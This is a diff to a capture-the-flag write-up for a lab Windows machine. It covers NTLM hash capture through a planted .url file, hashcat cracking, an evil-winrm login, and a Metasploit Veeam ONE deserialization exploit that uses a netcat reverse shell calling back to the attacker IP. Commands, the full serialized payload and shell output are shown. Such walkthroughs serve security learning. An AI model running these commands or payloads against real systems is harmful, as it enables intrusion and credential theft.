@@ -975,7 +975,8 @@ We have few services active, let's proceed to fingerprint:
 Let's update our hosts file with the discovered SAN
 
           10.10.254.1    set.windcorp.thm seth.windcorp.thm
-          
+
+## Get first foodhold in the system
 Now navigating the web site using DevTools, in the network tabs we can see a request for the following JS file:
 
           https://set.windcorp.thm/assets/js/search.js
@@ -1090,6 +1091,7 @@ Inspecting the content of the downloaded file:
           Zip and save your project files here. 
           We will review them
 
+## Compromised a second user
 So we got a hint to try some attacks. We have to find a way to execute a command once the file is unzipped. The command should be to visit a UNC path to our attacker machine to get NTLM credentials. This is a common scenario that we can accomplish using Responder. The problem here is to automatically execute the command. Since I have already faced this scenario, I created a .url file as follows:
 
           cat proj01.url                                                          
@@ -1125,7 +1127,7 @@ Now the story is always the same: trying to reverse the hashed credential:
 
           sudo hashcat -m 5600 -a 0 mwat-set /usr/share/wordlists/rockyou.txt
           ...
-                    MICHELLEWAT::SET:a8e00fd5274a1577...000:XXXXXXX
+          MICHELLEWAT::SET:a8e00fd5274a1577...000:XXXXXXX
                                                                     
           Session..........: hashcat
           Status...........: Cracked
@@ -1133,6 +1135,7 @@ Now the story is always the same: trying to reverse the hashed credential:
 
 <!-- !!!MICKEYmouse -->
 
+## Privilege escalation
 Using these credentials we can access get a remote shell:
 
           evil-winrm -i 10.10.254.1 -u MICHELLEWAT                                           
@@ -1328,9 +1331,80 @@ Then I spent quite a lot of time trying to make the module to work, but I always
           [*] 240.0.0.1:2805 - Executing command: powershell.exe -nop -w hidden ...
           [*] Exploit completed, but no session was created.
 
-We can infer that the most likely cause is the PowerShell Stager being blocked by AV on SET. I tried different combinations of targets and paylod, my last attempt was to use <b>cmd/windows/http/x64/shell/reverse_tcp_rc4</b>, since I had success in the past bypassing Defender, but this time I had no luck.
+We can infer that the most likely cause is the PowerShell Stager being blocked by AV on SET. I tried different combinations of targets and paylod, my last attempt was to use <b>cmd/windows/http/x64/shell/reverse_tcp_rc4</b>, since I had success in the past bypassing Defender, but this time I had no luck. 
+Then I decided to use a simple netcat reverse shell as paylod. First I downloaded netcat :
 
-*Evil-WinRM* PS C:\Users\MichelleWat\Documents> invoke-webrequest http://10.9.1.97:8000/nc64.exe -outfile nc.exe
+          *Evil-WinRM* PS C:\Users\MichelleWat\Documents> invoke-webrequest http://10.9.1.97:8000/nc64.exe -outfile nc.exe
+
+Then I configured the MSF module as follows:
+
+          msf6 exploit(windows/misc/veeam_one_agent_deserialization) > show options 
+
+          Module options (exploit/windows/misc/veeam_one_agent_deserialization):
+          
+             Name           Current Setting  Required  Description
+             ----           ---------------  --------  -----------
+             HOSTINFO_NAME  AgentController  yes       Name to send in host info (must be recognized by server!)
+             RHOSTS         240.0.0.1        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+             RPORT          2805             yes       The target port (TCP)
+             SSL            false            no        Negotiate SSL for incoming connections
+             SSLCert                         no        Path to a custom SSL certificate (default is randomly generated)
+             URIPATH                         no        The URI to use for this exploit (default is random)
+          
+          
+             When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+          
+          Name     Current Setting  Required  Description
+          ----     ---------------  --------  -----------
+          SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+          SRVPORT  8080             yes       The local port to listen on.
+
+          
+          Payload options (generic/custom):
+          
+             Name         Current Setting                                              Required  Description
+             ----         ---------------                                              --------  -----------
+             PAYLOADFILE                                                               no        The file to read the payload from
+             PAYLOADSTR   C:\Users\MichelleWat\Documents\nc.exe 10.9.1.97 1234 -e cmd  no        The string to use as a payload
+          
+          
+          Exploit target:
+          
+             Id  Name
+             --  ----
+             0   Windows Command
+
+Start a nc listener according to the PAYLOADSTR setting. Then run the exploit:
+
+          msf6 exploit(windows/misc/veeam_one_agent_deserialization) > run
+
+          [*] 240.0.0.1:2805 - Connecting to 240.0.0.1:2805
+          [*] 240.0.0.1:2805 - Sending host info to 240.0.0.1:2805
+          [+] 240.0.0.1:2805 - --> Host info packet: "\x05\x02\x0FAgentController"
+          [+] 240.0.0.1:2805 - <-- Host info reply: "\x03\x02\x00"
+          [*] 240.0.0.1:2805 - Executing Windows Command for generic/custom
+          [*] 240.0.0.1:2805 - Executing command: C:\Users\MichelleWat\Documents\nc.exe 10.9.1.97 1234 -e cmd
+          [*] 240.0.0.1:2805 - Sending malicious handshake to 240.0.0.1:2805
+          [+] 240.0.0.1:2805 - --> Handshake packet: "\v\x03\x00\x00\a\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF\x01\x00\x00\x00\x00\x00\x00\x00\f\x02\x00\x00\x00^Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\x05\x01\x00\x00\x00BMicrosoft.VisualStudio.Text.Formatting.TextFormattingRunProperties\x01\x00\x00\x00\x0FForegroundBrush\x01\x02\x00\x00\x00\x06\x03\x00\x00\x00\xA9\x04<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:X=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:S=\"clr-namespace:System;assembly=mscorlib\" xmlns:D=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider X:Key=\"\" ObjectType=\"{X:Type D:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><S:String>cmd</S:String><S:String>/c C:\\Users\\MichelleWat\\Documents\\nc.exe 10.9.1.97 1234 -e cmd</S:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>\v"
+          [+] 240.0.0.1:2805 - <-- Handshake reply: "\x00\x00\x00\x00\xAC\x11\x91>Y\xC9\xB7H\x80\\\x01v1\xA3\xDC\xEB\x0E\x00\x00\x00\a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00"
+          [*] Exploit completed, but no session was created.
+
+Don't be fooled by the error, indeed you will get a shell:
+
+          nc -lvp 1234              
+          listening on [any] 1234 ...
+          10.10.24.156: inverse host lookup failed: Unknown host
+          connect to [10.9.1.97] from (UNKNOWN) [10.10.24.156] 50665
+          Microsoft Windows [Version 10.0.17763.1339]
+          (c) 2018 Microsoft Corporation. All rights reserved.
+          
+          C:\windows\system32>whoami
+          whoami
+          set\one
+          
+          C:\windows\system32>hostname
+          hostname
+          SET
 
 
 
